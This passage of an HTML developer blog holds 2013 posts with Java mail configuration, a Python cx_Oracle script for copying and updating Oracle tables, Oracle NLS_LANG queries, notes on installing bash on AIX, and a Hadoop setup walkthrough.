replyTo;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setReplyTo(String replyTo) &#123;</span><br><span class="line">		this.replyTo = replyTo;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getTo() &#123;</span><br><span class="line">		return to;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setTo(String to) &#123;</span><br><span class="line">		this.to = to;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public Date getSent() &#123;</span><br><span class="line">		return sent;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setSent(Date sent) &#123;</span><br><span class="line">		this.sent = sent;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getSubject() &#123;</span><br><span class="line">		return subject;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setSubject(String subject) &#123;</span><br><span class="line">		this.subject = subject;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getBodyText() &#123;</span><br><span class="line">		return bodyText;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setBodyText(String bodyText) &#123;</span><br><span class="line">		this.bodyText = bodyText;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public List&lt;MimeBodyPart&gt; getBodyPart() &#123;</span><br><span class="line">		return bodyPart;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setBodyPart(List&lt;MimeBodyPart&gt; bodyPart) &#123;</span><br><span class="line">		this.bodyPart = bodyPart;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getCc() &#123;</span><br><span class="line">		return cc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setCc(String cc) &#123;</span><br><span class="line">		this.cc = cc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="mail-properties"><a href="#mail-properties" class="headerlink" title="mail.properties"></a>mail.properties</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#SMTP</span><br><span class="line">mail.smtp.host=smtpa.host</span><br><span class="line">mail.smtp.socketFactory.class=javax.net.ssl.SSLSocketFactory</span><br><span class="line">mail.smtp.ssl.enable=true</span><br><span class="line">mail.smtp.socketFactory.fallback=false</span><br><span class="line">mail.smtp.port=465</span><br><span class="line">mail.transport.protocol=smtps</span><br><span class="line">mail.smtp.socketFactory.port=465</span><br><span class="line">mail.smtp.auth=true</span><br><span class="line"></span><br><span class="line">#POP3</span><br><span class="line">mail.pop3s.host=pop3.host</span><br><span class="line">mail.pop3.socketFactory.class=javax.net.ssl.SSLSocketFactory</span><br><span class="line">mail.pop3.ssl.enable=true</span><br><span class="line">mail.pop3.socketFactory.fallback=false</span><br><span class="line">mail.pop3s.port=995</span><br><span class="line">mail.store.protocol=pop3s</span><br><span class="line">mail.pop3.socketFactory.port=995</span><br><span class="line">mail.pop3s.auth=true</span><br><span class="line"></span><br><span class="line">username=abc@abc.com</span><br><span class="line">password=password</span><br><span class="line">forwardTo=xyz@xyz.com</span><br><span class="line"></span><br><span class="line">logFile=c:/mail.log</span><br><span class="line">jssecacerts=jssecacerts</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-using-cx_Oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-11-14T06:11:54.000Z"><a href="/2013/11/14/using-cx_Oracle/">2013-11-14</a></time>
      
      
  
    <h1 class="title"><a href="/2013/11/14/using-cx_Oracle/">using cx_Oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line">import cx_Oracle, os</span><br><span class="line"></span><br><span class="line">os.environ[&quot;NLS_LANG&quot;] = &quot;TRADITIONAL CHINESE_HONG KONG.AL32UTF8&quot;</span><br><span class="line"></span><br><span class="line">def trim(str):</span><br><span class="line">    if str == None:</span><br><span class="line">        return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def trim2(strs):</span><br><span class="line">    list = []</span><br><span class="line">    for i in strs:</span><br><span class="line">        if i == None:</span><br><span class="line">            list.append(&#x27;&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            list.append(i)</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line">def generateSql(table, fields):</span><br><span class="line">    sql = &#x27;insert into %s(%s) values (&#x27; %(table, &#x27;,&#x27;.join(fields.split(&#x27;,&#x27;)) )</span><br><span class="line">    sql += &#x27;,&#x27;.join(map(lambda x: &#x27;:&#x27; + x , fields.split(&#x27;,&#x27;))) + &#x27;)&#x27;</span><br><span class="line">    return sql</span><br><span class="line"></span><br><span class="line">def generateValues(fields, row):</span><br><span class="line">    values = &#123;&#125;</span><br><span class="line">    f = fields.split(&#x27;,&#x27;)</span><br><span class="line">    for i in range(len(f)):</span><br><span class="line">        values[f[i]] = row[i]</span><br><span class="line">    return values</span><br><span class="line"></span><br><span class="line">def district(cur, extCur):</span><br><span class="line">    return (&#x27;district&#x27;, &#x27;MODULE,CAT_ID,CODE,NAME,DIST_CODE,LAST_UPDATE,UPDATE_BY,UPDATE_ROLE,WAIT_COUNT,INSPECTION_DIST_CODE&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def misc(cur, extCur):</span><br><span class="line">    return (&#x27;misc&#x27;, &#x27;NAME,CODE,DESCR,REMARK,UPDATE_ROLE,WAIT_COUNT,LAST_UPDATE,UPDATE_BY,DD,MM,YEAR,PERIOD,TYPE,REMARK1,DENY_RANK,DURATION_PARAM,REPORT_ID,LIC_TYPE_PARAM,DUMMY_PROMPT,DESCR2&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    os.environ[&quot;NLS_LANG&quot;] = &quot;TRADITIONAL CHINESE_HONG KONG.AL32UTF8&quot;</span><br><span class="line">    dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, service_name=&#x27;service-name&#x27;)</span><br><span class="line"></span><br><span class="line">    con = cx_Oracle.connect(&#x27;dhsms&#x27;,&#x27;useruat2621&#x27;,dsn_tns)</span><br><span class="line">    extCon = cx_Oracle.connect(&#x27;dhsms_int&#x27;,&#x27;useruat0675&#x27;,dsn_tns)</span><br><span class="line"></span><br><span class="line">    cur = con.cursor()</span><br><span class="line">    extCur = extCon.cursor()</span><br><span class="line">    try:</span><br><span class="line">        table, fields = task()</span><br><span class="line">        sql = &#x27;select %s from %s&#x27; %(&#x27;,&#x27;.join(fields.split(&#x27;,&#x27;)), table)</span><br><span class="line">        print sql</span><br><span class="line">        cur.execute(sql)</span><br><span class="line">        res = cur.fetchall()</span><br><span class="line">        for row in res:</span><br><span class="line">            extCur.execute(generateSql(table, fields), generateValues(fields, row))</span><br><span class="line"></span><br><span class="line">        extCon.commit()</span><br><span class="line"></span><br><span class="line">        cur.close()</span><br><span class="line">        extCur.close()</span><br><span class="line">    except cx_Oracle.DatabaseError, exc:</span><br><span class="line">        print exc</span><br><span class="line">        error, = exc.args</span><br><span class="line">        print error.message</span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line">        extCon.close()</span><br><span class="line"></span><br><span class="line">def updateCompanyPublish():</span><br><span class="line">    uat_dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, service_name=&#x27;uat&#x27;)</span><br><span class="line">    prd_dsn_tns = cx_Oracle.makedsn(&#x27;server-2&#x27;, 1521, service_name=&#x27;prd&#x27;)</span><br><span class="line"></span><br><span class="line">    uat_con = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,uat_dsn_tns)</span><br><span class="line">    prd_con = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,prd_dsn_tns)</span><br><span class="line"></span><br><span class="line">    uat_cur = uat_con.cursor()</span><br><span class="line">    prd_cur = prd_con.cursor()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        prd_cur.execute(&quot;select bus_name, bus_name_chn, unit, FLOOR, BLOCK, bldg, st_no, st_name, area_code, brc, brc_br_code from company where brc in (&#x27;12813641&#x27;,&#x27;05566198&#x27;,&#x27;14304442&#x27;,&#x27;09774317&#x27;,&#x27;17347013&#x27;,&#x27;10161559&#x27;,&#x27;04052247&#x27;,&#x27;10197423&#x27;,&#x27;02410516&#x27;,&#x27;06508541&#x27;,&#x27;19231608&#x27;,&#x27;18405151&#x27;,&#x27;05528392&#x27;,&#x27;08239275&#x27;,&#x27;02577649&#x27;,&#x27;08593841&#x27;,&#x27;06534261&#x27;,&#x27;07286166&#x27;,&#x27;01491507&#x27;,&#x27;07665609&#x27;,&#x27;02718104&#x27;,&#x27;04502925&#x27;,&#x27;37614254&#x27;,&#x27;07919620&#x27;,&#x27;EXEMPT07&#x27;,&#x27;10492160&#x27;,&#x27;13343992&#x27;,&#x27;02545054&#x27;,&#x27;02725127&#x27;,&#x27;04795495&#x27;,&#x27;16191407&#x27;,&#x27;00039087&#x27;,&#x27;04452570&#x27;,&#x27;05419513&#x27;,&#x27;18766876&#x27;,&#x27;01244344&#x27;,&#x27;05134767&#x27;,&#x27;00559994&#x27;)&quot;)</span><br><span class="line">        for row in prd_cur:</span><br><span class="line">            print row</span><br><span class="line">            uat_cur.execute(&#x27;update company_publish set bus_name=:bus_name,bus_name_chn=:bus_name_chn,unit=:unit,floor=:floor,block=:block,bldg=:bldg,st_no=:st_no,st_name=:st_name,area_code =:area_code where brc = :brc and brc_br_code = :brc_br_code&#x27;, &#123;&#x27;bus_name&#x27;:row[0], &#x27;bus_name_chn&#x27;:row[0],&#x27;bus_name_chn&#x27;:row[1],&#x27;unit&#x27;:row[2],&#x27;floor&#x27;:row[3],&#x27;block&#x27;:row[4],&#x27;bldg&#x27;:row[5],&#x27;st_no&#x27;:row[6],&#x27;st_name&#x27;:row[7],&#x27;area_code&#x27;:row[8],&#x27;brc&#x27;:row[9],&#x27;brc_br_code&#x27;:row[10]&#125;)</span><br><span class="line"></span><br><span class="line">        prd_cur.close()</span><br><span class="line">        uat_cur.close()</span><br><span class="line">        uat_con.commit()</span><br><span class="line"></span><br><span class="line">    finally:</span><br><span class="line">        uat_con.close()</span><br><span class="line">        prd_con.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#updateCompanyPublish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upgradeSeq():</span><br><span class="line">    dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, service_name=&#x27;service-name&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    extCon = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,dsn_tns)</span><br><span class="line">    extCur = extCon.cursor()</span><br><span class="line">    for i in range(10000):</span><br><span class="line">        extCur.execute(&#x27;select IE_DRUG_ID_SQ.NEXTVAL FROM DUAL&#x27;)</span><br><span class="line">    extCur.close()</span><br><span class="line">    extCon.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def updateAddress():</span><br><span class="line">    f = open(&#x27;advert_address.txt&#x27;)</span><br><span class="line">    c = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    os.environ[&quot;NLS_LANG&quot;] = &quot;TRADITIONAL CHINESE_HONG KONG.AL32UTF8&quot;</span><br><span class="line">    try:</span><br><span class="line">        dsn_tns = cx_Oracle.makedsn(&#x27;server-2&#x27;, 1521, &#x27;sid&#x27;)</span><br><span class="line">        con = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,dsn_tns)</span><br><span class="line">        cur = con.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for line in c.splitlines():</span><br><span class="line">            parts = line.split(&#x27;\t&#x27;)</span><br><span class="line">            seq_no = parts[0]</span><br><span class="line">            source_name = parts[1]</span><br><span class="line">            publisher = parts[2]</span><br><span class="line">            address = parts[3]</span><br><span class="line">            fax = parts[4]</span><br><span class="line">            tel = parts[5]</span><br><span class="line">            print seq_no, source_name, publisher, address</span><br><span class="line">            sql = &#x27;update advert_address set source_name = :source_name, publisher = :publisher, address = :address, fax = :fax, tel = :tel where seq_no = :seq_no&#x27;</span><br><span class="line">            cur.execute(sql, &#123;&#x27;seq_no&#x27;:seq_no, &#x27;source_name&#x27;:source_name, &#x27;publisher&#x27;:publisher, &#x27;address&#x27;:address, &#x27;fax&#x27;:fax, &#x27;tel&#x27;:tel&#125;)</span><br><span class="line">        cur.close()</span><br><span class="line">        con.commit()</span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def updateCompanyName():</span><br><span class="line">    f = open(&#x27;ML data.txt&#x27;)</span><br><span class="line">    c = f.read()</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, &#x27;psuat&#x27;)</span><br><span class="line">        con = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,dsn_tns)</span><br><span class="line">        cur = con.cursor()</span><br><span class="line"></span><br><span class="line">        for line in c.splitlines():</span><br><span class="line">            parts = line.split(&#x27;\t&#x27;)</span><br><span class="line">            name = parts[2]</span><br><span class="line">            file_no = parts[3]</span><br><span class="line">            if file_no != &#x27;&#x27;:</span><br><span class="line">                print name, file_no</span><br><span class="line">            sql = &#x27;update company_publish set bus_name_chn = :name where brc = (select brc from lic_app where file_no = :file_no)&#x27;</span><br><span class="line">            cur.execute(sql, &#123;&#x27;name&#x27;:name, &#x27;file_no&#x27;:file_no&#125;)</span><br><span class="line"></span><br><span class="line">            sql = &#x27;update company set bus_name_chn = :name where brc = (select brc from lic_app where file_no = :file_no)&#x27;</span><br><span class="line">            cur.execute(sql, &#123;&#x27;name&#x27;:name, &#x27;file_no&#x27;:file_no&#125;)</span><br><span class="line"></span><br><span class="line">        cur.close()</span><br><span class="line">        con.commit()</span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def updateUMAProdGroup():</span><br><span class="line">    f = open(&#x27;uma_group.txt&#x27;)</span><br><span class="line">    c = f.read()</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        dsn_tns = cx_Oracle.makedsn(&#x27;server-2&#x27;, 1521, &#x27;sid&#x27;)</span><br><span class="line">        con = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,dsn_tns)</span><br><span class="line">        cur = con.cursor()</span><br><span class="line"></span><br><span class="line">        for line in c.splitlines():</span><br><span class="line">            parts = line.split(&#x27;\t&#x27;)</span><br><span class="line">            name = parts[0]</span><br><span class="line">            code = parts[1]</span><br><span class="line">            descr = parts[2]</span><br><span class="line">            if name != &#x27;&#x27;:</span><br><span class="line">                print name, code, descr</span><br><span class="line"></span><br><span class="line">            sql = &#x27;insert into misc(name, code, descr) values (:name, :code, :descr)&#x27;</span><br><span class="line">            cur.execute(sql, &#123;&#x27;name&#x27;:name, &#x27;code&#x27;:code, &#x27;descr&#x27;:descr&#125;)</span><br><span class="line"></span><br><span class="line">        cur.close()</span><br><span class="line">        con.commit()</span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">#updateUMAProdGroup()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Insert-Unicode-Using-cx-Oracle-and-Setting-NLS_LANG-for-Oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-11-13T03:27:37.000Z"><a href="/2013/11/13/Insert-Unicode-Using-cx-Oracle-and-Setting-NLS_LANG-for-Oracle/">2013-11-13</a></time>
      
      
  
    <h1 class="title"><a href="/2013/11/13/Insert-Unicode-Using-cx-Oracle-and-Setting-NLS_LANG-for-Oracle/">Insert Unicode Using cx-Oracle and Setting NLS_LANG for Oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="set-enviroment-in-python-or-bash"><a href="#set-enviroment-in-python-or-bash" class="headerlink" title="set enviroment in python or bash"></a>set enviroment in python or bash</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.environ[“NLS_LANG”] = “TRADITIONAL CHINESE_HONG KONG.AL32UTF8” or</span><br><span class="line">export NLS_LANG=“TRADITIONAL CHINESE_HONG KONG.AL32UTF8”</span><br></pre></td></tr></table></figure>
<h1 id="get-lang-in-Oracle"><a href="#get-lang-in-Oracle" class="headerlink" title="get lang in Oracle"></a>get lang in Oracle</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT USERENV (&#x27;language&#x27;) FROM DUAL;</span><br><span class="line">select * from v$nls_parameters WHERE parameter IN ( &#x27;NLS_LANGUAGE&#x27;, &#x27;NLS_TERRITORY&#x27;, &#x27;NLS_CHARACTERSET&#x27;);</span><br><span class="line">SELECT * from NLS_DATABASE_PARAMETERS WHERE parameter IN ( &#x27;NLS_LANGUAGE&#x27;, &#x27;NLS_TERRITORY&#x27;, &#x27;NLS_CHARACTERSET&#x27;);</span><br></pre></td></tr></table></figure>
<h1 id="others"><a href="#others" class="headerlink" title="others"></a>others</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * FROM V$NLS_VALID_VALUES;</span><br><span class="line">select * from NLS_SESSION_PARAMETERS;</span><br><span class="line">select * from database_properties;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-bash-on-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-10-16T07:04:21.000Z"><a href="/2013/10/16/bash-on-AIX/">2013-10-16</a></time>
      
      
  
    <h1 class="title"><a href="/2013/10/16/bash-on-AIX/">bash on AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>Donwload Bash<br> goto <a target="_blank" rel="noopener" href="http://www-03.ibm.com/systems/power/software/aix/linux/toolbox/alpha.html">http://www-03.ibm.com/systems/power/software/aix/linux/toolbox/alpha.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/bash/bash-4.2-1.aix6.1.ppc.rpm`</span><br><span class="line">rpm -ivh bash-4.2-1.aix6.1.ppc.rpm</span><br></pre></td></tr></table></figure>
</li>
<li><p>Configure Bash<br> simple way just type <code>bash</code> in shell<br> change the default login shell<br> append a line of <code>/usr/bin/bash</code> to file &#x2F;etc&#x2F;security&#x2F;login.cfg<br> type <code>chsh</code> in shell</p>
</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://fixunix.com/aix/85066-how-set-bash-default-shell.html">how-set-bash-default-shell.html</a><br><a target="_blank" rel="noopener" href="http://aix4admins.blogspot.hk/2011/09/bash-initialization-shell-is-command.html">bash-initialization-shell-is-command</a><br><a target="_blank" rel="noopener" href="http://ruslanspivak.com/2010/09/20/bash-key-bindings/">bash-key-bindings</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-hadoop-on-nitrous.io" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-10-11T09:27:08.000Z"><a href="/2013/10/11/hadoop-on-nitrous.io/">2013-10-11</a></time>
      
      
  
    <h1 class="title"><a href="/2013/10/11/hadoop-on-nitrous.io/">hadoop on nitrous.io</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Prepare-SSH"><a href="#Prepare-SSH" class="headerlink" title="Prepare SSH"></a>Prepare SSH</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t dsa -P &#x27;&#x27; -f ~/.ssh/id_dsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vim /home/action/software/hadoop-1.2.1/conf/hadoop-env.sh</span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/java-7-oracle</span><br><span class="line"></span><br><span class="line">bin/hadoop namenode -format</span><br><span class="line"></span><br><span class="line">bin/hadoop fs -mkdir input</span><br><span class="line">bin/hadoop fs -put conf input</span><br><span class="line">bin/hadoop fs -cp conf/*.xml input</span><br><span class="line"></span><br><span class="line">bin/start-all.sh</span><br><span class="line"></span><br><span class="line">bin/hadoop jar hadoop-examples-1.2.1.jar grep input output &#x27;dfs[a-z.]+&#x27;</span><br><span class="line">bin/hadoop fs -rmr output</span><br><span class="line"></span><br><span class="line">bin/hadoop jar hadoop-examples-1.2.1.jar wordcount input output</span><br><span class="line">bin/hadoop fs -rmr output</span><br><span class="line"></span><br><span class="line">bin/stop-all.sh</span><br></pre></td></tr></table></figure>

<h2 id="core-site-xml"><a href="#core-site-xml" class="headerlink" title="core-site.xml"></a>core-site.xml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">     &lt;name&gt;fs.default.name&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;hdfs://localhost:9000&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">　　&lt;property&gt;</span><br><span class="line">　　　　&lt;name&gt;hadoop.tmp.dir&lt;/name&gt;</span><br><span class="line">　　　　&lt;value&gt;/home/action/tmp&lt;/value&gt;</span><br><span class="line">　　&lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h2 id="hdfs-site-xml"><a href="#hdfs-site-xml" class="headerlink" title="hdfs-site.xml"></a>hdfs-site.xml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.replication&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;1&lt;/value&gt;</span><br><span class="line"> &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

